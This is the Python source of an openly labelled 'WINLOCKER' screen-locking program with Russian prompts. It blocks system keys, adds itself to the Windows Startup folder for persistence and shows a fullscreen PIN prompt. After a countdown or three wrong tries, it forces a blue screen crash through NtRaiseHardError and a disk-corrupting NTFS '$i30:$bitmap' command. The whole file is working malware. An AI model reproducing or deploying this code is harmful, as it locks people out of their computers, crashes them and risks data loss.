
# -*- coding: utf-8 -*-

import tkinter as tk
import cv2
from PIL import Image, ImageTk
import pygame
import os
import sys
import keyboard
import ctypes.wintypes
import subprocess
import ctypes
import getpass


keyboard.block_key('win')
keyboard.block_key('f4')
keyboard.block_key('tab')
keyboard.block_key('esc')
keyboard.block_key('Del')
keyboard.block_key('shift')
keyboard.block_key('ctrl')
keyboard.block_key('alt')


PASSWORD = "2233"
COUNT = 3


file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

def startup(path):
	USER_NAME = getpass.getuser()
	global bat_path
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	
	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
		bat_file.write(r'start "" %s' % path)
        
startup(file_path)


if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))


VIDEO_PATH = os.path.join(BASE_DIR, "video.mp4")
SOUND_PATH = os.path.join(BASE_DIR, "sound.mp3")


pygame.mixer.init()

pygame.mixer.music.load(SOUND_PATH)
pygame.mixer.music.play(-1)


wind = tk.Tk()

wind.title("WINLOCKER")
wind.attributes("-fullscreen", True)
wind.attributes("-topmost", True)
wind.configure(bg="black")



left_frame = tk.Frame(
    wind,
    bg="black"
)

left_frame.place(
    relx=0,
    rely=0,
    relwidth=0.65,
    relheight=1
)


title = tk.Label(
    left_frame,
    text="WINLOCKER",
    fg="red",
    bg="black",
    font=("Arial", 28, "bold")
)

title.pack(pady=50)


label = tk.Label(
    left_frame,
    text="Введите пароль:",
    fg="white",
    bg="black",
    font=("Arial", 18)
)

label.pack(pady=10)


entry = tk.Entry(
    left_frame,
    show="*",
    font=("Arial", 20),
    justify="center"
)

entry.pack(pady=10)


error_label = tk.Label(
    left_frame,
    text=f"Попыток: {COUNT}",
    fg="red",
    bg="black",
    font=("Arial", 16)
)

error_label.pack(pady=10)

def uninstall(wind):
	wind.destroy()
	os.remove(bat_path + '\\' + "open.bat")
	keyboard.unhook_all()

def check_password():

    global COUNT

    if entry.get() == PASSWORD:

        pygame.mixer.music.stop()
        cap.release()
        wind.destroy()
        os.remove(bat_path + '\\' + "open.bat")
        keyboard.unhook_all()

        return

    

    # Неправильный пароль
    COUNT -= 1

    entry.delete(0, tk.END)

    if COUNT > 0:

        error_label.config(
            text=f"Неверный пароль. Осталось попыток: {COUNT}"
        )

    else:

        error_label.config(
            bsod()
        )

        

button_frame = tk.Frame(
    left_frame,
    bg="black"
)

button_frame.pack(pady=20)

unlock_text = tk.Label( left_frame, 
text="WINLOCKER", 
fg="white", 
bg="black", 
font=("Arial", 16, "bold"), 
justify="center" ) 
unlock_text.pack(pady=10)

timer_label = tk.Label(
    left_frame,
    text="До окончания: 60",
    fg="yellow",
    bg="black",
    font=("Arial", 18, "bold")
)


timer_label.pack(pady=10)

seconds = 180

def bsod():
	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def countdown():
    global seconds

    if seconds > 0:
        timer_label.config(
            text=f"Твой пк сгорит через: {seconds}"
        )
        seconds -= 1
        wind.after(1000, countdown)
    else:
        bsod()
        
countdown()



def add_number(number):

    entry.insert(
        tk.END,
        str(number)
    )

def add_number(number):

    entry.insert(
        tk.END,
        str(number)
    )


buttons = [
    ("1", 0, 0),
    ("2", 0, 1),
    ("3", 0, 2),

    ("4", 1, 0),
    ("5", 1, 1),
    ("6", 1, 2),

    ("7", 2, 0),
    ("8", 2, 1),
    ("9", 2, 2),

    ("0", 3, 1),
]


for text, row, column in buttons:

    button = tk.Button(
        button_frame,
        text=text,
        command=lambda x=text: add_number(x),
        width=5,
        height=2,
        font=("Arial", 16),
        bg="red",
        fg="white"
    )

    button.grid(
        row=row,
        column=column,
        padx=5,
        pady=5
    )


backspace_button = tk.Button(
    button_frame,
    text="⌫",
    command=lambda: entry.delete(
        len(entry.get()) - 1,
        tk.END
    ),
    width=5,
    height=2,
    font=("Arial", 16),
    bg="red",
    fg="white"
)

backspace_button.grid(
    row=3,
    column=0,
    padx=5,
    pady=5
)

enter_button = tk.Button(
    button_frame,
    text="OK",
    command=check_password,
    width=5,
    height=2,
    font=("Arial", 16),
    bg="red",
    fg="white"
)

enter_button.grid(
    row=3,
    column=2,
    padx=5,
    pady=5
)

right_frame = tk.Frame(
    wind,
    bg="black"
)

right_frame.place(
    relx=0.65,
    rely=0,
    relwidth=0.35,
    relheight=1
)

video_label = tk.Label(
    right_frame,
    bg="black"
)

video_label.pack(
    expand=True
)

cap = cv2.VideoCapture(VIDEO_PATH)

def show_video():

    ret, frame = cap.read()

    if not ret:

        cap.set(
            cv2.CAP_PROP_POS_FRAMES,
            0
        )

        ret, frame = cap.read()

    if ret:

        frame = cv2.cvtColor(
            frame,
            cv2.COLOR_BGR2RGB
        )

        frame = cv2.resize(
            frame,
            (500, 350)
        )

        image = Image.fromarray(frame)

        photo = ImageTk.PhotoImage(
            image=image
        )

        video_label.config(
            image=photo
        )

        video_label.image = photo

    wind.after(
        30,
        show_video
    )

show_video()
wind.mainloop()
cap.release()
pygame.mixer.music.stop()
pygame.mixer.quit()